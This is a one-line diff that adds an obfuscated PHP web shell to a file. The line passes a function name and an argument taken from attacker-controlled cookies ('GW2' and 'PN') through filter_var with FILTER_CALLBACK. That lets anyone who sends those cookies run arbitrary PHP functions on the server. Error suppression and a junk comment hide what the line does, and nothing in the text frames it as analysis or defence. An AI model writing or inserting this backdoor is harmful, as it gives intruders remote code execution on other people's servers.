@@ -1,0 +1,1 @@
+<?php @filter_var($_COOKIE {PN},FILTER_CALLBACK,array('options'=>@$_COOKIE{  "GW2"}/*uv0uh94p*/) );
